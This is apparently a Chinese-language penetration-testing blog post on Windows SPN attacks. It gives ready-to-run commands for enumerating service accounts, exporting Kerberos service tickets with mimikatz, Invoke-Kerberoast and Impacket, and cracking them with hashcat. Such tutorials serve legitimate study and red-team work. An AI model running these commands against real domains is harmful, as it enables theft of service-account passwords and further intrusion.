---
title: "Windows SPN 攻击"
date: 2019-07-19T00:00:00+08:00
draft: false
tags: ["windows",'spn']
categories: ["内网渗透"]
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

SPN 全称 Service Principal Name, 即服务主体名称. 将服务实例和服务账户与 Kerberos 协议相关联. 简单来说, SPN 使得域内的服务(例如 MSSQL Exchange FTP CIFS)在进行身份认证时都能采用 Kerberos 协议.

<!--more-->

## 信息收集

因为通常一部分服务会在域中注册 SPN, 而域中的所有用户都有权限查看 SPN 信息, 所以我们就可以利用 SPN 来达到无须端口探测以进行信息收集的目的.

常用 SPN 对应的服务 [ADSecurity](https://adsecurity.org/?page_id=183).

几种查询 SPN 信息的方式.

### setspn

```
setspn -Q */* // 查看所有 SPN
setspn -Q */DC // 查看 DC 主机的 SPN
```

### Powershell-AD-Recon

MSSQL.

```
Import-Module .\Discover-PSMSSQLServers.ps1
Discover-PSMSSQLServers
```
Exchange.

```
Import-Module .\Discover-PSMSExchangeServers.ps1
Discover-PSMSExchangeServers
```

HTTP FTP TERMSRV DNS... 

```
Import-Module .\Discover-PSInterestingServices.ps1
Discover-PSInterestingServices
```

按账户查看 SPN.

```
Import-Module .\Find-PSServiceAccounts.ps1
Find-PSServiceAccounts
```

### Kerberoast

```
cscript GetUserSPNs.vbs
```

`GetUserSPNs.ps1` 本地测试失败.


## 凭据爆破

当 Kerberos 凭据为 RC4\_HMAC\_MD5 加密时, 可通过 Kerberoast 或 Hashcat 进行凭据爆破.

域内机器为 2003 及以下时, 默认采用 RC4\_HMAC\_MD5 方式加密 Kerberos 凭据, 2008 R2 及以上系统需在组策略中手动更改(默认为 AES 加密).

先导出从 KDC 申请的 TGS Ticket. 然后再进行爆破. 这里有三种方法.

### mimikatz

```
kerberos::purge
kerberos::ask /target:MSSQLSvc/DC.test.com:1433
kerberos::list /export
```

### Invoke-Kerberoast

作者原本的 ps 脚本有错误. 要使用 Empire 中的版本.

```
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast.ps1 -OutputFormat hashcat | fl
```

### Impacket

可以在非域主机上导出 Hashcat 格式的密文. 需要域内用户的凭据.

```
GetUserSPNs.py -request -dc-ip 192.168.1.100 test.com/user
Password: ******* // Input password for user
```

导出后可通过 Kerberoast 自带的工具或 JohnTheRipper, Hashcat 爆破.

### Kerberoast

```
tgsrepcrack.py passwords.txt mssql.kirbi
```

### Hashcat

```
hashcat -m 13100 hash.txt passwords.txt
```

### 后续利用

Kerberoast 中的 `kerberoast.py` 可通过爆破得出的密码解密 Ticket, 不过在实际测试中一直失败(具体可看 [kerberoast issue](https://github.com/nidem/kerberoast/issues/11)).

个人认为可通过明文密码加上服务账户的用户名直接登录到对应的服务器(如 MSSQL Exchange FTP WEB CIFS), 也能使用 mimikatz 申请对应的 TGS Ticket 来访问服务, 不过暂未做具体测试.
